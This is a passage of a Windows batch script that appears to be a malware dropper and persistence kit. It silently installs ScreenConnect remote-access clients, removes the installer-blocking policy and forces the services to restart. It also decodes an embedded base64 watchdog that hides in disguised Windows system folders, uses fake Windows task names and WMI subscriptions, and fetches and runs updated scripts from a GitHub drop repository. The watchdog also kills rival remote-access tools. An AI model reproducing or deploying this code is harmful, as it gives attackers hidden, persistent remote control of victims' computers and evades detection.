  msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa.log"
  set "GEXIT=!ERRORLEVEL!"
  echo gryxa_msiexec_exit=!GEXIT!>>"%LOG%"
  if "!GEXIT!"=="1618" (
    timeout /t 30 /nobreak >nul
    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa2.log"
    set "GEXIT=!ERRORLEVEL!"
    echo gryxa_msiexec_retry1618=!GEXIT!>>"%LOG%"
  )
  if "!GEXIT!"=="1618" (
    timeout /t 45 /nobreak >nul
    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa3.log"
    set "GEXIT=!ERRORLEVEL!"
    echo gryxa_msiexec_retry1618b=!GEXIT!>>"%LOG%"
  )
  timeout /t 10 /nobreak >nul
) else (
  echo gryxa_msi_fetch_FAIL>>"%LOG%"
)

sc query "%GRYXA%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_postinstall_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP3%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 6 /nobreak >nul
)
sc config "%GRYXA%" start= auto >nul 2>&1
sc failure "%GRYXA%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%GRYXA%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%GRYXA%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%GRYXA%" >nul 2>&1

REM gryxa msiexec can disturb sevrz - nudge keepers
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo gryxa_must_running_ok>>"%LOG%"
) else (
  echo gryxa_must_still_down>>"%LOG%"
  sc query "%GRYXA%" >>"%LOG%" 2>&1
)
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTI4DQpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50
aS1zaWduYXR1cmUpLCBtdXR1YWwNCnJlbSAgV01JK3NjaHRhc2tzLCBHcnl4YSA4aCBkZWVwIGhl
YWx0aCAoVENQL3JlbGF5L0ZQIGRyaWZ0IHJlaW5zdGFsbCkuDQpyZW0gIEF1dGhvcml6ZWQgaW50
ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpzZXQgIktF
RVBfRlA9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM0MjciDQpz
ZXQgIkdSWVhBX0ZQPTk5MDgxOThlNjY4ZTQ3NTAiDQpzZXQgIldEPUM6XFByb2dyYW1EYXRhXE1p
Y3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJFVEw9QzpcUHJvZ3JhbURh
dGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0QlXG93
bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24uc3RhdGUiDQpzZXQgIkhCRkxBRz0l
V0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwuZXhlIg0K
c2V0ICJURz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHVi
LWRyb3AvbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiVEcyPWh0
dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3RnX3Jl
cG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcuZ2l0
aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3VyZS5j
bWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUMyPWh0dHBzOi8vY2RuLmpzZGVsaXZy
Lm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9zZWN1cmUuY21kP3Q9JVJBTkRP
TSUlUkFORE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
bS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9N
JSINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0
aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJ
Qj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3Av
bWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJQjI9aHR0cHM6
Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX2xpYi5w
czE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJMPWh0dHBzOi8vdWkuc2V2cnouY29t
L0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0
ICJNU0lfR1JZWEE9aHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNvbm5lY3QuQ2xpZW50
U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiDQpzZXQgIk1TSV9QS0cxPWh0dHBzOi8vcmF3Lmdp
dGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3BrZy5tc2kiDQpz
ZXQgIk1TSV9QS0cyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWIt
ZHJvcEBtYWluL3BrZy5tc2kiDQpzZXQgIk1TST0lUHJvZ3JhbURhdGElXFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2V0dXAubXNpIg0Kc2V0ICJNU0lDQUNIRT0lV0QlXHBrZy5tc2kiDQpzZXQgIk1TSV9H
PSVQcm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5Hcnl4YS5tc2kiDQpzZXQgIk1TSUNBQ0hFX0c9
JVdEJVxwa2dfZ3J5eGEubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1kICIlV0QlIiAyPm51
bA0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlwZSBudWw+IiVMT0clIiAyPm51bA0KDQpzZXQgIk1P
TlZFUj1NMjgiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiR1JZWEFfREVF
UD0lV0QlXGdyeXhhX2RlZXAuZmxhZyINCnJlbSBsb2FkIGN1cnJlbnQgR3J5eGEgRlAgKG1heSBy
b3RhdGUgd2hlbiBzZXJ2ZXIva2V5cyBjaGFuZ2UpDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmci
IGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4
YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0K
aWYgbm90IGRlZmluZWQgR1JZWEFfRlAgc2V0ICJHUllYQV9GUD05OTA4MTk4ZTY2OGU0NzUwIg0K
Zm9yIC9mICJ0b2tlbnM9MS0zIGRlbGltcz0vICIgJSVhIGluICgiJWRhdGUlIikgZG8gc2V0ICJE
VD0lZGF0ZSUgJXRpbWUlIg0KZWNoby4+PiIlTE9HJSINCmVjaG8g4pSA4pSAIHRpY2sgIURUISBb
dmVyICVNT05WRVIlXSDilIDilIA+PiIlTE9HJSINCnNldCAiQ09VTlQ9MCINCnNldCAiSU5TVEFM
TEVEPTAiDQpzZXQgIlBSSU1fT0s9MCINCnNldCAiQUxUX09LPTAiDQpzZXQgIkZPUkVJR05fTEVG
VD0wIg0Kc2V0ICJGT1JFSUdOX0xJU1Q9Ig0Kc2V0ICJNU0lFWElUPW5vdC1ydW4iDQoNCnJlbSDi
lIDilIAgWzBdIHNpbmdsZS1mbGlnaHQgbXV0ZXggKHN0b3Agb3ZlcmxhcHBpbmcgdGlja3MgcmFj
aW5nIG1zaWV4ZWMpIOKUgOKUgA0Kc2V0ICJNVVRFWD0lV0QlXHRpY2subG9jayINCmlmIGV4aXN0
ICIlTVVURVglIiAoDQogIGZvciAlJUEgaW4gKCIlTVVURVglIikgZG8gc2V0ICJMT0NLQUdFPSUl
fnRBIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJp
ZigoVGVzdC1QYXRoICclTVVURVglJykgLWFuZCAoKChHZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRl
cmFsUGF0aCAnJU1VVEVYJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0
IDgpKXsgZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZl
bCAxICgNCiAgICBlY2hvIHRpY2tfc2tpcHBlZF9tdXRleF9idXN5Pj4iJUxPRyUiDQogICAgZW5k
bG9jYWwNCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KZWNobyAlREFURSUgJVRJTUUlICVSQU5ET00l
PiIlTVVURVglIg0KDQpyZW0g4pSA4pSAIHBlci1ob3N0IGlkZW50aXR5IChhbnRpLXNpZ25hdHVy
ZSkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVs
bCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmls
ZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBpbml0IC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+
JjENCmlmIGV4aXN0ICIlV0QlXGlkZW50aXR5LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9
MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGlkZW50aXR5LmNmZyIpIGRvIHNldCAiJSVLPSUl
TCINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQSBzZXQgIlRBU0tfQT1XZXJRdWV1ZVN5bmMiDQppZiBu
b3QgZGVmaW5lZCBUQVNLX0Igc2V0ICJUQVNLX0I9UGxhU2VydmVySGVhbHRoIg0KaWYgbm90IGRl
ZmluZWQgVEFTS19DIHNldCAiVEFTS19DPVdkaUhvc3RQcm94eSINCmlmIG5vdCBkZWZpbmVkIFRB
U0tfRCBzZXQgIlRBU0tfRD1UY3BJcENvbmZsaWN0UmVzIg0KaWYgbm90IGRlZmluZWQgTU9fQSBz
ZXQgIk1PX0E9MiINCmlmIG5vdCBkZWZpbmVkIE1PX0Igc2V0ICJNT19CPTMiDQoNCnJlbSDilIDi
lIAgW0FdIGF1dG8tdXBkYXRlIGNvcmUgZmlsZXMgKGJlc3QgZWZmb3J0KSDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIG5vdCBleGlzdCAi
JUNVUkwlIiBzZXQgIkNVUkw9Y3VybC5leGUiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2Ug
LS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3JlcG9ydC5uZXci
ICIlVEclIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJUNV
UkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcdGdfcmVw
b3J0Lm5ldyIgIiVURzIlIiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVx0Z19yZXBv
cnQucHMxIiA+bnVsIDI+JjENCmZpbmRzdHIgL0M6IlRHX1JFUE9SVCBCVUlMRCIgIiVXRCVcdGdf
cmVwb3J0Lm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXHRnX3JlcG9ydC5uZXci
KSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlV0Ql
XHRnX3JlcG9ydC5wczEiID5udWwgMj4mMQ0KZGVsIC9mIC9xICIlV0QlXHRnX3JlcG9ydC5uZXci
ID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0
IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVPV05TRUMlIiA+bnVs
IDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVDVVJMJSIgLUwgLS1j
b25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIlV0QlXG93bl9zZWN1cmUubmV3IiAi
JU9XTlNFQzIlIiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fc2VjdXJlLmNt
ZCIgPm51bCAyPiYxDQpmaW5kc3RyIC9DOiJPV05fU0VDVVJFIEJVSUxEIiAiJVdEJVxvd25fc2Vj
dXJlLm5ldyIgPm51bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXG93bl9zZWN1cmUubmV3Iikg
ZG8gaWYgJSV+ekYgR1RSIDgwMCBtb3ZlIC95ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJVdEJVxv
d25fc2VjdXJlLmNtZCIgPm51bCAyPiYxDQpkZWwgL2YgL3EgIiVXRCVcb3duX3NlY3VyZS5uZXci
ID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0
IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbGliLm5ldyIgIiVPV05MSUIlIiA+bnVsIDI+
JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLm5ldyIgIiVDVVJMJSIgLUwgLS1jb25uZWN0
LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIubmV3IiAiJU9XTkxJQjIl
IiA+bnVsIDI+JjENCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYx
DQpmaW5kc3RyIC9DOiJPV05fTElCICBCVUlMRCIgIiVXRCVcb3duX2xpYi5uZXciID5udWwgMj4m
MSAmJiBmb3IgJSVGIGluICgiJVdEJVxvd25fbGliLm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAw
IG1vdmUgL3kgIiVXRCVcb3duX2xpYi5uZXciICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+JjEN
CmRlbCAvZiAvcSAiJVdEJVxvd25fbGliLm5ldyIgPm51bCAyPiYxDQpyZW0gc2VsZi11cGRhdGU6
IGRvd25sb2FkIG5ldyBvd25fbW9uLCBhcHBseSBBRlRFUiB0aGlzIHRpY2sgKEJVSUxELXZlcmlm
aWVkKQ0Kc2V0ICJTRUxGX1VQRD0wIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29u
bmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbW9uLm5leHQiICIlT1dO
TU9OJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX21vbi5uZXh0IiAiJUNVUkwl
IiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5u
ZXh0IiAiJU9XTk1PTjIlIiA+bnVsIDI+JjENCmZpbmRzdHIgL0M6Ik9XTl9NT04gIEJVSUxEIiAi
JVdEJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBmb3IgJSVG
IGluICgiJVdEJVxvd25fbW9uLm5leHQiKSBkbyBpZiAlJX56RiBHVFIgMTUwMCAoDQogIGZjIC9i
ICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICBpZiBl
cnJvcmxldmVsIDEgc2V0ICJTRUxGX1VQRD0xIg0KKQ0KaWYgIiVTRUxGX1VQRCUiPT0iMCIgZGVs
IC9mIC9xICIlV0QlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxDQoNCnJlbSDilIDilIAgW0JdIHJl
LWFybSBjaGFpbiAxOiBvd25lcnNoaXAtYXdhcmUgKG5vdCBleGlzdGVuY2Utb25seSkg4pSA4pSA
DQpyZW0gTDExL00yMjogUXVlcnktb25seSBza2lwcGVkIHJlYXJtIHdoZW4gV2luZG93cyBidWls
dC1pbiB0YXNrcyBzaGFyZWQNCnJlbSBkZWZhdWx0IG5hbWVzIChEaWFnbm9zaXNcU2NoZWR1bGVk
IGV0Yy4pIC0+IG1vbiBuZXZlciByYW4sIG5vIGxvZy4NCmlmIGV4aXN0ICIlV0QlXG93bl9saWIu
cHMxIiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB0YXNrcy1lbnN1cmUgLVdvcmtEaXIgIiVXRCUiIC1N
b25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvICgNCiAgICBlY2hvIHRhc2tzX2Vuc3VyZSAl
JVI+PiIlTE9HJSINCiAgICBzZXQgIlRBU0tTX0VOU1VSRT0lJVIiDQogICkNCikNCmlmIG5vdCBl
eGlzdCAiJUVUTCUiIG1rZGlyICIlRVRMJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdEJVxvd25f
bW9uLmNtZCIgKA0KICBhdHRyaWIgLWggLXMgLXIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVsIDI+
JjENCiAgY29weSAveSAiJVdEJVxvd25fbW9uLmNtZCIgIiVFVEwlXGV0bF9tb24uY21kIiA+bnVs
IDI+JjENCikNCg0KcmVtIOKUgOKUgCBbQjJdIHJlLWFybSBjaGFpbiAyIChXTUkgc3Vic2NyaXB0
aW9uKSBpZiBtaXNzaW5nIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVX
RCVcb3duX2xpYi5wczEiICgNCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBw
b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHdhdGNoZG9nLWVuc3VyZSAtV29y
a0RpciAiJVdEJSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkgZG8gc2V0ICJXRF9TVEFU
RT0lJVIiDQogIGlmIC9JICIhV0RfU1RBVEUhIj09IlJFQVJNRUQiIGVjaG8gd2F0Y2hkb2cgV01J
IFJFQVJNRUQ+PiIlTE9HJSINCikNCg0KcmVtIOKUgOKUgCBbRV0gZXh0ZXJtaW5hdGUgZm9yZWln
biBTQyArIGRpc2FsbG93ZWQgUk1NIChCRUZPUkUgaGVhbC9pbnN0YWxsLA0KcmVtICAgICBzbyB0
aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rpb24gbmV2ZXIgY29sbGlkZXMgd2l0aCByaXZhbHMp
IOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmls
ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
X2xpYi5wczEiIC1BY3Rpb24gZXh0ZXJtaW5hdGUgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAy
PiYxDQp0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bA0Kc2V0ICJGT1JFSUdOX0xFRlQ9MCINCmZv
ciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBe
fCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgN
CiAgc2V0ICJGUD0lJWEiDQogIHNldCAiRlA9IUZQOiA9ISINCiAgaWYgL0kgbm90ICIhRlAhIj09
IiVLRUVQX0ZQJSIgaWYgL0kgbm90ICIhRlAhIj09IiVBTFRfRlAlIiBpZiAvSSBub3QgIiFGUCEi
PT0iJUdSWVhBX0ZQJSIgKA0KICAgIHNldCAvYSBDT1VOVCs9MQ0KICAgIHNldCAvYSBGT1JFSUdO
X0xFRlQrPTENCiAgICBzZXQgIkZPUkVJR05fTElTVD0hRk9SRUlHTl9MSVNUISFGUCEgIg0KICAg
IGVjaG8gZm9yZWlnbl9sZWZ0XyFGUCE+PiIlTE9HJSINCiAgKQ0KKQ0KDQpyZW0g4pSA4pSAIFtD
XSBoZWFsIFNjcmVlbkNvbm5lY3QgcHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
DQpmb3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIF58IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRSIn
KSBkbyAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTVNUQVRFPSUlYiINCikNCnNj
IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5H
IiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJQUklNX09LPTEiDQogIHNldCAv
YSBDT1VOVCs9MQ0KKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
ID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgL2EgQ09VTlQrPTENCnNjIHF1ZXJ5
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwN
CmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRfT0s9MSINCg0KaWYgIiVJTlNUQUxMRUQlIj09
IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBlY2hvIHN2YyBoZWFsIHJlc3RhcnQ+PiIlTE9H
JSINCiAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAy
PiYxDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAy
PiYxDQogIHRpbWVvdXQgL3QgNiAvbm9icmVhayA+bnVsDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBl
cnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiDQopDQpyZW0gTTE2OiBzdGlsbCBzdG9wcGVkIC0+
IHJlcGFpciB0aGUgUkVHSVNURVJFRCBwcm9kdWN0IChtc2lleGVjIC9mYSByZXN0b3Jlcw0KcmVt
IGJpbmFyaWVzICsgc3RhcnRzIHRoZSBzZXJ2aWNlOyBMNSBSZXBhaXItU0NTZXJ2aWNlIGhhbmRs
ZXMgc3RvcHBlZCBzdmNzKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0i
MCIgKA0KICBlY2hvIHN2YyBlc2NhbGF0ZSByZXBhaXI+PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVX
RCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVw
YWlyIC1GcCAiJUtFRVBfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCiAgdGlt
ZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwg
MSBzZXQgIlBSSU1fT0s9MSINCikNCnJlbSBNMTY6IG9ycGhhbmVkIHNlcnZpY2UgZW50cnkgKHBy
b2R1Y3QgdW5yZWdpc3RlcmVkIC0gZWF0ZW4gYnkgYW4gU0MtZmFtaWx5DQpyZW0gdXBncmFkZSBy
